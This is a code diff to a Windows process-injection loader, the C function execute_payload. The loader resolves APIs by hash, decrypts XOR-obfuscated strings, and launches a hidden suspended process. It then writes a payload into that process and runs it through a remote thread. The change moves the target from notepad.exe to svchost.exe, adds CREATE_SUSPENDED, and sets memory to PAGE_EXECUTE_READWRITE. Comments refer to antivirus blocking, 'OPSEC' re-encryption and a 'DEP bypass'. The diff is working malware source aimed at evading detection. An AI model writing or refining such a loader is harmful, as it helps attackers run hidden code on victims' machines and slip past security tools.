@@ -16,7 +16,10 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
     
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
-    char enc_target_process[] = { 0x1c, 0x49, 0x29, 0x27, 0x5a, 0x1d, 0x57, 0x0c, 0x05, 0x40, 0x28, 0x38, 0x4a, 0x0a, 0x2b, 0x3a, 0x1e, 0x46, 0x42, 0x6f, 0x1d, 0x5c, 0x17, 0x17, 0x43, 0x15, 0x0f, 0x1d, 0x1c, 0x27, 0x3a, 0x73 };
+    // char enc_target_process[] = { 0x1c, 0x49, 0x29, 0x27, 0x5a, 0x1d, 0x57, 0x0c, 0x05, 0x40, 0x28, 0x38, 0x4a, 0x0a, 0x2b, 0x3a, 0x1e, 0x46, 0x42, 0x6f, 0x1d, 0x5c, 0x17, 0x17, 0x43, 0x15, 0x0f, 0x1d, 0x1c, 0x27, 0x3a, 0x73 };
+    // new target process: "C:\\Windows\\System32\\svchost.exe"
+    char enc_target_process[] = { 0x1c, 0x49, 0x29, 0x27, 0x5a, 0x1d, 0x57, 0x0c, 0x05, 0x40, 0x28, 0x38, 0x4a, 0x0a, 0x2b, 0x3a, 0x1e, 0x46, 0x42, 0x6f, 0x00, 0x45, 0x00, 0x1a, 0x5c, 0x07, 0x1f, 0x1d, 0x1c, 0x27, 0x3a, 0x73, 0x75 };
+
 
     // API hashes
     // NOTE: calculate these using hasher.py
@@ -49,21 +52,21 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     // if AV blocks a function -> return
     if (!fnCreateProcessA || !fnVirtualAllocEx || !fnWriteProcessMemory || !fnVirtualProtectEx || !fnCreateRemoteThread || !fnCloseHandle) return false;
 
-    // --- setup target process (notepad.exe)
+    // --- setup target process (svchost.exe)
 
     STARTUPINFOA si = { 0 };
     si.cb = sizeof(si);
     // NOTE: force GUI window to remain hidden
     si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE; 
+    si.wShowWindow = SW_HIDE;
 
     PROCESS_INFORMATION pi = { 0 };
     
     xor_crypt(enc_target_process, sizeof(enc_target_process), cypher_key, cypher_key_len);
     
     // NOTE: use CREATE_NO_WINDOW flag to not show GUI
-    bool proc_created = fnCreateProcessA(NULL, enc_target_process, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    
+    // NOTE: use CREATE_SUSPENDED flag to not end process early
+    bool proc_created = fnCreateProcessA(NULL, enc_target_process, NULL, NULL, FALSE, CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, NULL, &si, &pi);    
     // OPSEC: recypher
     xor_crypt(enc_target_process, sizeof(enc_target_process), cypher_key, cypher_key_len);
 
@@ -91,7 +94,7 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
 
     // change permissions to execute (DEP bypass)
     DWORD oldProtect = 0;
-    if (!fnVirtualProtectEx(pi.hProcess, remote_buffer, payload_size, PAGE_EXECUTE_READ, &oldProtect)) {
+    if (!fnVirtualProtectEx(pi.hProcess, remote_buffer, payload_size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
         fnCloseHandle(pi.hProcess);
         fnCloseHandle(pi.hThread);
         return false;
